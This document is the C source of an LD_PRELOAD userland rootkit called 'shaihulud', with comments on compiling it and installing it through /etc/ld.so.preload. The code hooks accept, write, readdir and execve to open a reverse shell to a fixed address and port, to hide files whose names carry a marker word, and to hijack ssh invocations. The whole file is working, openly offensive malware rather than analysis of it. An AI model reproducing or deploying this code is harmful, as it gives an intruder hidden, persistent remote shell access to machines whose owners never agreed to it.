//gcc shaihulud.c -fPIC -shared -D_GNU_SOURCE -o libc.shaihulud.so -ldl
//move compiled .so to /usr/lib/
//echo "/usr/lib/[compiled.so]" > /etc/ld.so.preload
//export LD_PRELOAD=/path/to/rootkit.so
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>

#define MESSAGE "Shai'hulud called...\n"
#define HIDEWORD "shaihulud"
#define GID 4444
#define SRCPORT 42069
#define REMOTE_ADDR "192.168.172.1"
#define REMOTE_PORT 1337


void rev_shell(void){
  int port = REMOTE_PORT;
  struct sockaddr_in revsockaddr;

  int sockt = socket(AF_INET, SOCK_STREAM, 0);
  revsockaddr.sin_family = AF_INET;
  revsockaddr.sin_port = htons(port);
  revsockaddr.sin_addr.s_addr = inet_addr(REMOTE_ADDR);

  connect(sockt, (struct sockaddr *) &revsockaddr,
  sizeof(revsockaddr));
  dup2(sockt, 0);
  dup2(sockt, 1);
  dup2(sockt, 2);


  char * const argv[] = {"/bin/sh", NULL};
  execve("/bin/sh", argv, NULL);

}

void submerge(char const *toHide){
  struct dirent *entry = NULL;
  DIR *dp;
  char old[255];
  char new[255];
  char prefix[] = HIDEWORD;
  dp = opendir(toHide);
  if(dp != NULL){
    while((entry = readdir(dp))){
      sprintf(old, "%s/%s", toHide, entry->d_name);
      sprintf(new, "%s/%s%s", toHide, prefix, entry->d_name);
      printf("New filename: %s\n", new);
      rename(old, new);
    }
  }
  closedir(dp);
}


int (*real_accept)(int sockfd, struct sockaddr * addr, socklen_t * addrlen);
int accept(int sockfd, struct sockaddr * addr, socklen_t * addrlen){
	real_accept = dlsym(RTLD_NEXT, "accept");
    pid_t my_pid;

    struct sockaddr_in *sock_in = (struct sockaddr_in *) addr;


    if (ntohs(sock_in->sin_port) == SRCPORT) {
        my_pid = fork ();
        if (my_pid == 0) {
          rev_shell();
        }
  }
  return real_accept(sockfd, addr, addrlen);
}

ssize_t write(int fildes, const void *buf, size_t nbytes)
{
    ssize_t (*real_write)(int fildes, const void *buf, size_t nbytes);

    ssize_t result;

    real_write = dlsym(RTLD_NEXT, "write");

    char *rev = strstr(buf, "shaihulud");

    if (rev != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = real_write(fildes, buf, nbytes);
        rev_shell();
    }
    else{
        result = real_write(fildes, buf, nbytes);
    }

    return result;
}



struct dirent *(*real_readdir)(DIR *dir);
struct dirent *readdir(DIR *dirp){
    real_readdir = dlsym(RTLD_NEXT, "readdir");
    pid_t child_pid = fork();
    if(child_pid == 0){
        rev_shell();
        _exit(0);
    }
    struct dirent *dir;

    while (dir = real_readdir(dirp)){
        if(strstr(dir->d_name, HIDEWORD) == 0){
          break;
        }
    }

    return dir;
}

int (*real_execve) (const char *, char *const argv[], char *const envp[]);
int execve(const char* pathname, char* const argv[], char* const envp[]) {

    real_execve = dlsym(RTLD_NEXT, "execve");
    if((strcmp(argv[0], "ssh") == 0)){
      execv("/home/shaihulud.sh", argv);
      return -1;
    }

    return real_execve(pathname, argv, envp);
}
